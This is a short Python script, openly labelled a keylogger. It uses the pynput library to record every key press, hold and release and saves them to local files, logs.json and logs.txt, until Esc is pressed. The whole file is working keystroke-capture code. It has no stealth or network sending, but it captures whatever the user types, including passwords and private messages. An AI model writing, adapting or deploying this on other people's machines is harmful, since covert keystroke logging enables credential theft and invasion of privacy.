from pynput import keyboard
import json

key_list = []
key_strokes = ""   # for txt file
x = False


def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log, indent=4)


def update_txt_file(text):
    with open('logs.txt', 'w') as file:
        file.write(text)


def on_press(key):
    global x, key_list, key_strokes

    try:
        k = key.char   # normal keys
    except:
        k = str(key)   # special keys

    if not x:
        key_list.append({'Pressed': k})
        x = True
    else:
        key_list.append({'Held': k})

    key_strokes += k   # add key to text

    update_json_file(key_list)
    update_txt_file(key_strokes)


def on_release(key):
    global x, key_list

    key_list.append({'Released': str(key)})
    x = False

    update_json_file(key_list)

    if key == keyboard.Key.esc:
        return False


print("[+] Running keylogger successfully")
print("[!] Saving logs in 'logs.json' and 'logs.txt'\n")

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
